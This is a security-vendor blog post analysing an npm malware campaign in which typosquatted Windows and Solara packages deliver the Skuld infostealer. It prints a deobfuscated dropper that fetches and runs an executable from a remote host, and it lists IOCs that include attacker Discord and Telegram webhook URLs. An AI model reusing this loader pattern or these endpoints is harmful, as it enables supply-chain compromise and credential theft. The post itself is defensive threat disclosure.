---
title: "Skuld Infostealer Returns to npm with Fake Windows Utilities and Malicious Solara Development Packages"
short_title: "Skuld Infostealer Returns to npm"
date: 2024-12-18 12:00:00 +0000
categories: [Malware, npm]
tags: [Skuld, Infostealer, Typosquatting, Obfuscation, npm, JavaScript, Roblox, Solara, T1195.002, T1059.007, T1036.005, T1027.013, T1546.016, T1555.003, T1552.001, T1567.004]
canonical_url: https://socket.dev/blog/skuld-infostealer-returns-to-npm
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/1d4a636a3c33fd49764d5771e17d4eef5fccc59e-1024x1024.webp
  alt: "Skuld Infostealer Returns to npm"
description: "Socket researchers discovered a malware campaign on npm delivering the Skuld infostealer via typosquatted packages, exposing sensitive data."
---

Socket's threat research team identified a malware campaign infiltrating the npm ecosystem, deploying the Skuld infostealer just weeks after a similar attack [targeted](https://socket.dev/blog/roblox-developers-targeted-with-npm-packages-infected-with-infostealers) Roblox developers. The threat actor, identified as "k303903" on npm registry, disguised malicious packages — [`windows-confirm`](https://socket.dev/npm/package/windows-confirm/overview/1.0.0), [`windows-version-check`](https://socket.dev/npm/package/windows-version-check/overview/1.0.3), [`downloadsolara`](https://socket.dev/npm/package/downloadsolara), and [`solara-config`](https://socket.dev/npm/package/solara-config/overview/1.0.1) — as legitimate tools. Before their removal, these packages compromised hundreds of machines, demonstrating how even low-complexity attacks can rapidly gain traction.

The npm registry's swift response helped limit the spread and impact of this malicious campaign. However, the persistent nature of such attacks and the reuse of open source malware like the Skuld infostealer highlight that this issue is far from disappearing. By studying these recent incidents, developers and organizations can strengthen their defenses, safeguard credentials, and adopt more vigilant development practices.

> December 20 - 31, 2024 update: The threat actors identified as "shegotit2" and "hnfwmmo1" on the npm registry are highly likely the same individual as "k303903", based on their use of identical or highly similar tactics, techniques, and procedures (TTPs). Furthermore, Datadog Security Labs has confirmed another threat actor, "pressurized", on the npm registry, who is also highly likely the same threat actor operating under a different account. This conclusion is supported by the consistent use of the same TTPs to infiltrate the npm ecosystem with malware. We have petitioned the npm registry to remove all identified malicious packages that may still be active. Indicators of Compromise (IOCs) associated with all identified aliases are detailed in the dedicated IOC section below.

## Skuld Infostealer Returns to Poison the npm Well

This latest malicious campaign delivering the Skuld infostealer marks the second time in two months that this malware has targeted npm developers. It closely mirrors a previous attack [reported](https://socket.dev/blog/roblox-developers-targeted-with-npm-packages-infected-with-infostealers) by Socket on November 8, 2024, where Roblox developers were compromised via npm packages infected with Skuld and Blank Grabber malware. Further supporting this, Datadog Security Labs [published](https://securitylabs.datadoghq.com/articles/mut-8964-an-npm-and-pypi-malicious-campaign-targeting-windows-users/) research on November 22, 2024, that reinforced the scale and sophistication of the threat. In December 2024, the attack has resurfaced, where a threat actor used typosquatting and simple yet effective techniques to compromise development machines and exfiltrate sensitive data.

The return of the Skuld infostealer to npm highlights a recurring pattern: attackers gain a foothold, achieve brief success, and swiftly adapt by reintroducing the threat with new packaging and distribution strategies. The December 2024 campaign exhibits the same familiar hallmarks: obfuscation, typosquatting, deceptive tactics, reliance on commodity malware, and common deployment methods.

![Screenshot showcasing Skuld's ability to steal passwords, cookies, sensitive files, and browsing history from Chromium and Gecko-based browsers.](https://cdn.sanity.io/images/cgdhsj6q/production/cc9e9aab8e72f0c90b22765baba85ea9ca46a316-538x792.png)
_Screenshot showcasing Skuld's ability to steal passwords, cookies, sensitive files, and browsing history from Chromium and Gecko-based browsers._

## Malicious Code

The following malicious [code](https://socket.dev/npm/package/windows-confirm/files/1.0.0/index.js) snippet, deobfuscated, defanged, and annotated with comments, offers insight into the threat actor's methods.

```javascript
const fs = require("fs-extra");
const path = require("path");
const fetch = require("node-fetch");
const { exec } = require("child_process");

const exeFilePath = path.join(__dirname, "download.exe");

// Downloads and writes the malicious binary to disk, then executes it.
async function downloadFile(url, dest) {
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error("HTTP error! status: " + response.status);
  }
  const buffer = await response.buffer();
  await fs.writeFile(dest, buffer);
}

async function runExecutable() {
  try {

    // The URL is disguised to appear legitimate, using a Cloudflare-like domain.
    await downloadFile("hxxps://alternatives-suits-obtained-bowl.trycloudflare[.]com/page", exeFilePath);
    exec(exeFilePath, (error) => {
      if (error) {
        console.error("Error running the executable: " + error);
      }
    });
  } catch (err) {
    console.error("Download error: " + err);
  }
}

runExecutable();
```

The threat actor employed [Obfuscator.io](http://Obfuscator.io), a widely used open source tool, to obfuscate the package code and evade initial detection. The Skuld infostealer payload was hosted on URLs designed to appear legitimate, including a domain impersonating Cloudflare. Upon installation, the malicious package silently fetched and executed the malware under the filename `download.exe` (SHA256: `27b86c1a24a1c97952397943f7b7ef21ee6859145556fe1b197e89074672bd07`).

![Socket AI Scanner's analysis, including contextual details about the malicious package.](https://cdn.sanity.io/images/cgdhsj6q/production/f1e8f16335926847e7d2c3e9d3e4af1df8ac6978-625x618.png)
_Socket AI Scanner's analysis, including contextual details about the malicious package._

## Threat Actor's Strategy

The threat actor k303903 employed typosquatting by uploading npm packages that mimicked well-known productivity and web development libraries, including masquerading as Windows-related utilities and [Solara](https://solara.dev/) — a Python framework for building interactive web applications. By publishing packages that appeared legitimate or closely related to these tools, the threat actor aimed to deceive developers into installing them without thoroughly inspecting the package code.

For data exfiltration, the threat actor used a Discord webhook (`hxxps://discord[.]com/api/webhooks/1316651715591667752/GNxf9DlNvCZmJ27gRfOlHCEVgvOG-kYbj6d2h5zaX48DpP41elqDEdBvoK1y4F1gpbbw`), enabling data transfers and establishing command and control (C2) operations. The use of widely available, open source tools and services kept operational costs low while maximizing the campaign's reach. To further deceive developers, the threat actor used legitimate-looking commands and paths to fetch the executable payload from a seemingly trustworthy source and from a legitimate service `replit.dev`. Although trivial to set up, Discord webhooks are a very common method for data exfiltration, allowing threat actors to blend into legitimate developer communication channels and testing environments.

![The threat actor posing their malicious package as a legitimate library to deceive users.](https://cdn.sanity.io/images/cgdhsj6q/production/4597a59a5d30e53396fe2a6e94740cdfb4cfdb94-839x582.png)
_The threat actor posing their malicious package as a legitimate library to deceive users._

## Impact Assessment

The malicious packages were downloaded more than 600 times before they were removed. Although the npm registry responded quickly — taking down the initial test package `aaaa89852889` within one day and the subsequent, above-mentioned packages within four to five days — the impact on affected users was significant. Credentials, tokens, and other sensitive data were likely stolen, jeopardizing both individual developers and organizational networks. Short-lived campaigns like this can have long-lasting consequences, as compromised credentials may be weaponized well after the malicious packages are removed.

This attack mirrors the November 2024 incident, highlighting a troubling pattern: threat actors are pivoting rapidly, reusing known malware strains, and refining their deception techniques. The continued use of the Skuld infostealer demonstrates how commodity malware can cause devastating damage when distributed through trusted supply chains.

## Recommendations and Mitigations

Securing your development environment requires a layered approach. While basic measures like verifying package authorship and relying on trusted repositories are important, using automation and specialized tools is essential to keep up with rapidly evolving threats. Deploying free and real-time supply chain security tools, such as Socket's free [GitHub app](https://socket.dev/features/github), [CLI](https://socket.dev/features/cli), and [browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop), can intercept malicious code early in the development lifecycle. These tools scan pull requests and installations to block harmful dependencies before they integrate into your environment.

### MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1036.005 — Masquerading: Match Legitimate Name or Location
- T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File
- T1546.016 — Event Triggered Execution: Installer Packages
- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1552.001 — Unsecured Credentials: Credentials In Files
- T1567.004 — Exfiltration Over Web Service: Exfiltration Over Webhook

## Indicators of Compromise (IOCs) — k303903

### Malicious Packages

- `windows-confirm`
- `windows-version-check`
- `downloadsolara`
- `solara-config`
- `aaaa89852889`

### Malicious URLs

- hxxps://alternatives-suits-obtained-bowl.trycloudflare[.]com/page
- hxxps://971cfdde-59b5-4929-b162-6118a1825652-00-2zv0j6z5p6zi4.riker.replit[.]dev/page
- hxxps://971cfdde-59b5-4929-b162-6118a1825652-00-2zv0j6z5p6zi4.riker.replit[.]dev/start

### Discord Webhook

- hxxps://discord[.]com/api/webhooks/1316651715591667752/GNxf9DlNvCZmJ27gRfOlHCEVgvOG-kYbj6d2h5zaX48DpP41elqDEdBvoK1y4F1gpbbw

### SHA256 Hashes

- 27b86c1a24a1c97952397943f7b7ef21ee6859145556fe1b197e89074672bd07

## Indicators of Compromise (IOCs) — shegotit2

### Malicious Packages

- `o7rcyti43qv`
- `bootstrapper-solara`
- `solara-upgrade`

### Malicious URLs

- hxxps://tours-picture-hunt-electrical.trycloudflare[.]com/page
- hxxps://pointer-walt-blond-bi.trycloudflare[.]com/page
- hxxps://fossil-otherwise-stylus-sq.trycloudflare[.]com/page
- common-temperature.gl.at.ply[.]gg:38635

### Telegram Webhook

- hxxps://api.telegram[.]org/bot7740258238:AAFZwAKMURbNCg1N0L12TTCRXWYfqUe93To

### SHA256 Hashes

- 3f78493b9bf7a448bec44c154343e6a372ebb0dc3188e61b4699f166896d7181

## Indicators of Compromise (IOCs) — pressurized

### Malicious Packages

- `atlantis-api`
- `xeno-api`
- `core-builder`
- `upgrade-solara`
- `xeno-builder`
- `get-matcha`
- `solara-builder`
- `solara-cleanup`
- `solara-installer`
- `solarainstaller`
- `powerupdate`
- `windows.solara`
- `windowsversionupdate`
- `solaramatcher`
- `deathball`
- `updkernels`
- `antibyfron`
- `programcleanup`
- `robloxint`

### Malicious URLs

- hxxps://eed964e7-461c-4428-9c46-808d77ede57c-00-26f8c6izoatcc.worf.replit[.]dev/skuld
- hxxps://3d7a78cb-b661-450d-b035-888519a4df86-00-udawht6rsoni.spock.replit[.]dev/skuld
- hxxps://eed964e7-461c-4428-9c46-808d77ede57c-00-26f8c6izoatcc.worf.replit[.]dev/blank
- hxxps://3d7a78cb-b661-450d-b035-888519a4df86-00-udawht6rsoni.spock.replit[.]dev/blank
- hxxps://eed964e7-461c-4428-9c46-808d77ede57c-00-26f8c6izoatcc.worf.replit[.]dev/empyrean
- hxxps://3d7a78cb-b661-450d-b035-888519a4df86-00-udawht6rsoni.spock.replit[.]dev/empyrean
- hxxps://ebdfa635-60a4-499e-9da8-2b609eb309c3-00-3k30gj5i2z09x.riker.replit[.]dev/kyore
- hxxps://ebdfa635-60a4-499e-9da8-2b609eb309c3-00-3k30gj5i2z09x.riker.replit[.]dev/sk
- hxxps://ebdfa635-60a4-499e-9da8-2b609eb309c3-00-3k30gj5i2z09x.riker.replit[.]dev/ps
- hxxps://github.com/ifhw/code/raw/main/cmd[.]exe
- hxxps://github.com/ifhw/code/raw/main/RuntimeServiceWorker[.]exe
- hxxps://github.com/ifhw/code/raw/main/py[.]exe

## Indicators of Compromise (IOCs) — hnfwmmo1

### Malicious Packages

- `solaraexecutor`
- `xeno.dll`

### Malicious URLs

- hxxps://gtk-optimize-webpage-tc.trycloudflare[.]com/page
- hxxps://spending-musicians-ebony-under.trycloudflare[.]com/page

### Discord Webhook

- hxxps://discord[.]com/api/webhooks/1322351361119223888/scjrfnBelA3CHVyP-UCE2RDtX1sv1JqXUkufCoxGEw-xvr9CfyhxWNH0hwUwEIs7qH8i

### SHA256 Hashes

- 30c03e81698be9142d4cb187ac987e6a93b49bb8d9c171e84d09056a6ca40417
